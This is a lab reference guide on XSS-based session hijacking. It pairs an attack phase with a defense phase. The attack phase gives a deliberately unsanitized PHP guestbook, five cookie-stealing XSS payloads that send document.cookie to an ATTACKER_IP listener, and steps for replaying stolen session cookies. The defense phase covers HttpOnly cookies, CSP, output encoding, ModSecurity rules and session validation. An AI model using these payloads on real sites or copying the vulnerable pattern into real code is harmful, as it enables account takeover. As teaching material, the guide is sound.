# QUICK REFERENCE GUIDE
## Session Hijacking with CookieCatcher - Commands & Code

This is your go-to reference for actual implementation. Copy-paste these commands during your testing.

---

## 🔧 ENVIRONMENT SETUP

### Install Required Software (Kali Linux/Ubuntu)

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install PHP
sudo apt install php php-cli -y

# Install Apache (optional, for vulnerable app)
sudo apt install apache2 -y

# Verify installations
php -v
apache2 -v
```

### Download CookieCatcher

```bash
# Navigate to /opt directory
cd /opt

# Clone CookieCatcher
sudo git clone https://github.com/DigitalInterruption/cookie-catcher.git

# Navigate into directory
cd cookie-catcher

# List files
ls -la
```

---

## 🎯 ATTACK PHASE

### Step 1: Start CookieCatcher

```bash
# Navigate to CookieCatcher directory
cd /opt/cookie-catcher

# Start PHP built-in server
php -S 0.0.0.0:8080

# Expected output:
# [Date Time] PHP X.X.X Development Server (http://0.0.0.0:8080) started
```

**Alternative with custom IP:**
```bash
# If you need specific IP
php -S 192.168.1.10:8080
```

**Test the listener:**
```bash
# In another terminal
curl http://localhost:8080
```

### Step 2: Create Vulnerable Web Application

Create file: `/var/www/html/vulnerable_app.php`

```php
<?php
session_start();
?>
<!DOCTYPE html>
<html>
<head>
    <title>Vulnerable Guestbook</title>
    <style>
        body { font-family: Arial; padding: 20px; }
        .comment { background: #f0f0f0; padding: 10px; margin: 10px 0; }
        textarea { width: 100%; height: 100px; }
    </style>
</head>
<body>
    <h1>Guestbook (Vulnerable)</h1>
    
    <?php
    if(isset($_POST['comment'])) {
        // VULNERABLE: No sanitization!
        $comment = $_POST['comment'];
        echo "<div class='comment'>Comment: " . $comment . "</div>";
    }
    ?>
    
    <form method="POST">
        <textarea name="comment" placeholder="Leave a comment..."></textarea>
        <br>
        <button type="submit">Submit</button>
    </form>
</body>
</html>
```

**Start the vulnerable application:**
```bash
# If using Apache
sudo systemctl start apache2
# Access: http://localhost/vulnerable_app.php

# OR using PHP built-in server
cd /var/www/html
php -S 0.0.0.0:80
# Access: http://localhost/vulnerable_app.php
```

### Step 3: XSS Payloads (Try These)

**Payload 1: Basic Script Tag** (Usually blocked)
```html
<script>document.location='http://ATTACKER_IP:8080/?c='+document.cookie</script>
```

**Payload 2: Image Tag with Error Handler** (Often works)
```html
<img src=x onerror="this.src='http://ATTACKER_IP:8080/?c='+document.cookie">
```

**Payload 3: Base64 Encoded** (Advanced)
```html
<img src=x onerror="fetch('http://ATTACKER_IP:8080/?c='+btoa(document.cookie))">
```

**Payload 4: SVG Onload**
```html
<svg onload="fetch('http://ATTACKER_IP:8080/?c='+document.cookie)">
```

**Payload 5: Input Autofocus**
```html
<input autofocus onfocus="location='http://ATTACKER_IP:8080/?c='+document.cookie">
```

**Replace ATTACKER_IP with your actual IP:**
```bash
# Find your IP
ip addr show
# or
ifconfig
# or
hostname -I
```

### Step 4: Inject Payload

1. Open vulnerable application in browser
2. Paste one of the payloads above into the comment field
3. Click "Submit"
4. Watch CookieCatcher terminal for captured cookies

### Step 5: Use Stolen Cookies

**Method 1: Browser DevTools (Chrome)**
```
1. Press F12 to open DevTools
2. Go to "Application" tab
3. Click "Cookies" in left sidebar
4. Click your website domain
5. Double-click cookie value to edit
6. Paste stolen cookie value
7. Refresh page - you're now hijacked!
```

**Method 2: Using cURL**
```bash
# Use captured cookie in command
curl -b "PHPSESSID=abc123xyz789;user_id=12345" \
     http://target-site.com/dashboard

# With headers
curl -b "PHPSESSID=abc123xyz789" \
     -H "User-Agent: Mozilla/5.0" \
     http://target-site.com/profile
```

**Method 3: EditThisCookie Extension**
```
1. Install EditThisCookie extension
2. Click extension icon
3. Click "+" to add new cookie
4. Enter Name: PHPSESSID
5. Enter Value: (stolen value)
6. Click checkmark
7. Refresh page
```

---

## 🛡️ DEFENSE PHASE

### Defense #1: HttpOnly and Secure Cookies

**Update vulnerable_app.php:**
```php
<?php
// SECURE: Configure session before starting
ini_set('session.cookie_httponly', 1);  // Prevent JS access
ini_set('session.cookie_secure', 1);    // HTTPS only
ini_set('session.cookie_samesite', 'Strict');  // CSRF protection
ini_set('session.use_strict_mode', 1);  // Reject uninitialized IDs
ini_set('session.use_only_cookies', 1); // Don't use URL sessions

session_start();
?>
```

**Or using session_set_cookie_params():**
```php
<?php
session_set_cookie_params([
    'lifetime' => 3600,
    'path' => '/',
    'domain' => 'example.com',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);

session_start();
?>
```

**Test HttpOnly:**
```javascript
// Open browser console (F12)
console.log(document.cookie);
// Should NOT show HttpOnly cookies
```

### Defense #2: Content Security Policy

**Method 1: PHP Header**
```php
<?php
header("Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self';");
?>
```

**Method 2: Apache .htaccess**
```apache
<IfModule mod_headers.c>
    Header set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';"
</IfModule>
```

**Method 3: Nginx Configuration**
```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';" always;
```

**Test CSP:**
Try injecting XSS payload - should see browser console error:
```
Refused to execute inline script because it violates the 
following Content Security Policy directive: "script-src 'self'"
```

### Defense #3: Input Validation & Output Encoding

**Secure version of vulnerable_app.php:**
```php
<?php
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
session_start();

// CSP Header
header("Content-Security-Policy: default-src 'self'; script-src 'self'");

// Initialize comments array
if(!isset($_SESSION['comments'])) {
    $_SESSION['comments'] = [];
}

if($_SERVER['REQUEST_METHOD'] === 'POST') {
    // SECURE: Sanitize input
    $comment = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');
    
    // Additional validation
    if(strlen($comment) > 500) {
        $error = "Comment too long (max 500 characters)";
    } else {
        $_SESSION['comments'][] = $comment;
        $success = "Comment added successfully!";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Secure Guestbook</title>
</head>
<body>
    <h1>Secure Guestbook</h1>
    
    <?php if(isset($error)): ?>
        <div style="color: red;"><?php echo htmlspecialchars($error); ?></div>
    <?php endif; ?>
    
    <?php if(isset($success)): ?>
        <div style="color: green;"><?php echo htmlspecialchars($success); ?></div>
    <?php endif; ?>
    
    <h2>Comments:</h2>
    <?php foreach($_SESSION['comments'] as $comment): ?>
        <div class="comment">
            <?php echo $comment; // Already sanitized ?>
        </div>
    <?php endforeach; ?>
    
    <form method="POST">
        <textarea name="comment" maxlength="500" required></textarea>
        <br>
        <button type="submit">Submit</button>
    </form>
</body>
</html>
```

**Key Sanitization Functions:**
```php
// HTML context
htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

// JavaScript context
json_encode($input);

// URL context
urlencode($input);

// SQL context (use prepared statements)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);
```

### Defense #4: Web Application Firewall (ModSecurity)

**Install ModSecurity:**
```bash
# Ubuntu/Debian
sudo apt install libapache2-mod-security2 -y

# Enable module
sudo a2enmod security2

# Copy recommended config
sudo cp /etc/modsecurity/modsecurity.conf-recommended \
        /etc/modsecurity/modsecurity.conf

# Edit config
sudo nano /etc/modsecurity/modsecurity.conf
```

**Enable ModSecurity in config file:**
```apache
# Change from DetectionOnly to On
SecRuleEngine On

# Set audit log
SecAuditLog /var/log/apache2/modsec_audit.log
SecAuditLogType Serial
```

**Add Custom Rules:**
Create file: `/etc/modsecurity/custom_rules.conf`
```apache
# Block XSS in script tags
SecRule ARGS "@rx <script" \
    "id:1000,phase:2,deny,status:403,msg:'XSS Attack: <script> tag detected'"

# Block common XSS patterns
SecRule ARGS "@rx (?i)(on\w+\s*=|javascript:|<iframe|<object)" \
    "id:1001,phase:2,deny,status:403,msg:'XSS Attack: Event handler detected'"

# Block document.cookie attempts
SecRule ARGS "@rx document\.cookie" \
    "id:1002,phase:2,deny,status:403,msg:'Cookie theft attempt detected'"

# Block eval, atob, btoa
SecRule ARGS "@rx eval\(|atob\(|btoa\(" \
    "id:1003,phase:2,deny,status:403,msg:'Suspicious JavaScript function'"
```

**Include custom rules in Apache config:**
```apache
# Edit: /etc/apache2/mods-enabled/security2.conf
Include /etc/modsecurity/custom_rules.conf
```

**Restart Apache:**
```bash
sudo systemctl restart apache2
```

**Test WAF:**
```bash
# Should return 403 Forbidden
curl "http://localhost/vulnerable_app.php?comment=<script>alert(1)</script>"
```

### Defense #5: Advanced Session Management

**Complete secure session class:**

Create file: `SecureSession.php`
```php
<?php
class SecureSession {
    
    private static $sessionTimeout = 1800; // 30 minutes
    
    public static function init() {
        // Secure cookie parameters
        ini_set('session.cookie_httponly', 1);
        ini_set('session.cookie_secure', 1);
        ini_set('session.cookie_samesite', 'Strict');
        ini_set('session.use_strict_mode', 1);
        ini_set('session.use_only_cookies', 1);
        
        session_start();
        
        if (!isset($_SESSION['initiated'])) {
            self::initializeSession();
        }
        
        if (!self::validateSession()) {
            self::destroySession();
            die('Session validation failed. Possible hijacking attempt detected.');
        }
        
        if (self::isTimedOut()) {
            self::destroySession();
            die('Session expired. Please log in again.');
        }
        
        $_SESSION['last_activity'] = time();
    }
    
    private static function initializeSession() {
        $_SESSION['initiated'] = true;
        $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];
        $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
        $_SESSION['created_at'] = time();
        $_SESSION['last_activity'] = time();
        $_SESSION['fingerprint'] = self::generateFingerprint();
    }
    
    private static function generateFingerprint() {
        $data = $_SERVER['HTTP_USER_AGENT'] . 
                $_SERVER['REMOTE_ADDR'] .
                ($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
        return hash('sha256', $data);
    }
    
    private static function validateSession() {
        // Check IP address
        if ($_SESSION['ip_address'] !== $_SERVER['REMOTE_ADDR']) {
            error_log('Session hijacking attempt: IP mismatch - ' .
                     'Expected: ' . $_SESSION['ip_address'] .
                     ', Got: ' . $_SERVER['REMOTE_ADDR']);
            return false;
        }
        
        // Check user agent
        if ($_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
            error_log('Session hijacking attempt: User-Agent mismatch');
            return false;
        }
        
        // Check fingerprint
        if ($_SESSION['fingerprint'] !== self::generateFingerprint()) {
            error_log('Session hijacking attempt: Fingerprint mismatch');
            return false;
        }
        
        return true;
    }
    
    private static function isTimedOut() {
        if (isset($_SESSION['last_activity'])) {
            $elapsed = time() - $_SESSION['last_activity'];
            return ($elapsed > self::$sessionTimeout);
        }
        return false;
    }
    
    public static function regenerate() {
        session_regenerate_id(true);
        $_SESSION['regenerated_at'] = time();
    }
    
    public static function destroySession() {
        $_SESSION = array();
        if (isset($_COOKIE[session_name()])) {
            setcookie(session_name(), '', time()-3600, '/');
        }
        session_destroy();
    }
    
    public static function login($user_id) {
        self::regenerate();
        $_SESSION['user_id'] = $user_id;
        $_SESSION['authenticated'] = true;
        $_SESSION['login_time'] = time();
        error_log("User $user_id logged in from {$_SERVER['REMOTE_ADDR']}");
    }
    
    public static function isAuthenticated() {
        return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
    }
}
?>
```

**Usage in application:**
```php
<?php
require_once 'SecureSession.php';

// Initialize secure session
SecureSession::init();

// After successful login
if ($login_successful) {
    SecureSession::login($user_id);
    header('Location: dashboard.php');
    exit;
}

// Check authentication
if (!SecureSession::isAuthenticated()) {
    header('Location: login.php');
    exit;
}

// Rest of your application code
?>
```

---

## 🧪 TESTING COMMANDS

### Test Attack Success (Before Defense)
```bash
# Start CookieCatcher
php -S 0.0.0.0:8080

# Inject payload in vulnerable app
# Wait for cookie capture
# Check CookieCatcher output for captured cookies
```

### Test Defense Effectiveness

**Test 1: HttpOnly**
```javascript
// Browser console
console.log(document.cookie);
// Should be empty or not show session cookies
```

**Test 2: CSP**
```html
<!-- Try injecting this -->
<script>alert('XSS')</script>
<!-- Should see CSP error in console -->
```

**Test 3: Input Sanitization**
```html
<!-- Submit this -->
<img src=x onerror="alert(1)">
<!-- Should be displayed as text, not executed -->
```

**Test 4: WAF**
```bash
curl "http://localhost/app.php?input=<script>alert(1)</script>"
# Should return: 403 Forbidden
```

**Test 5: Session Validation**
```bash
# Capture cookie from IP1
# Try using same cookie from IP2
# Should fail with validation error
```

---

## 📊 LOGGING AND MONITORING

### Enable PHP Error Logging
```php
<?php
// Add to your PHP files
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', '/var/log/php_errors.log');
?>
```

### Monitor Apache Logs
```bash
# Access log
tail -f /var/log/apache2/access.log

# Error log
tail -f /var/log/apache2/error.log

# ModSecurity audit log
tail -f /var/log/apache2/modsec_audit.log
```

### Custom Logging for CookieCatcher
```bash
# Redirect output to file
php -S 0.0.0.0:8080 > cookiecatcher.log 2>&1 &

# View log
tail -f cookiecatcher.log
```

---

## 🚨 TROUBLESHOOTING

### CookieCatcher Not Receiving Cookies
```bash
# Check if port is open
sudo netstat -tulpn | grep 8080

# Check firewall
sudo ufw status
sudo ufw allow 8080/tcp

# Test locally first
curl "http://localhost:8080/?c=test"
```

### Apache Not Starting
```bash
# Check status
sudo systemctl status apache2

# Check config syntax
sudo apache2ctl configtest

# View errors
sudo journalctl -u apache2 -n 50
```

### PHP Session Not Working
```bash
# Check session directory permissions
ls -la /var/lib/php/sessions/
sudo chmod 1733 /var/lib/php/sessions/

# Check PHP session settings
php -i | grep session
```

### ModSecurity Blocking Legitimate Traffic
```bash
# Temporarily disable for testing
sudo a2dismod security2
sudo systemctl restart apache2

# Or switch to DetectionOnly mode
# In /etc/modsecurity/modsecurity.conf:
SecRuleEngine DetectionOnly
```

---

## ✅ VERIFICATION CHECKLIST

### Attack Phase
- [ ] CookieCatcher running on port 8080
- [ ] Vulnerable app accessible
- [ ] XSS payload bypasses filters
- [ ] Cookies captured successfully
- [ ] Session hijacking successful

### Defense Phase
- [ ] HttpOnly cookies enabled (verify in DevTools)
- [ ] CSP headers present (check network tab)
- [ ] Input sanitization working (XSS displayed as text)
- [ ] WAF blocking attacks (403 errors)
- [ ] Session validation working (IP/UA checks)

### Documentation
- [ ] Screenshots of each step saved
- [ ] Command outputs logged
- [ ] Error messages documented
- [ ] Success/failure rates recorded
- [ ] Timing information captured

---

## 💾 BACKUP YOUR WORK

```bash
# Create backup directory
mkdir -p ~/project-backup

# Backup code
cp -r /var/www/html ~/project-backup/
cp -r /opt/cookie-catcher ~/project-backup/

# Backup logs
sudo cp /var/log/apache2/* ~/project-backup/logs/
cp cookiecatcher.log ~/project-backup/

# Create archive
tar -czf session-hijacking-backup-$(date +%Y%m%d).tar.gz ~/project-backup/
```

---

**QUICK TIP**: Keep this file open in a separate window during your testing for easy copy-paste access!

**END OF QUICK REFERENCE GUIDE**
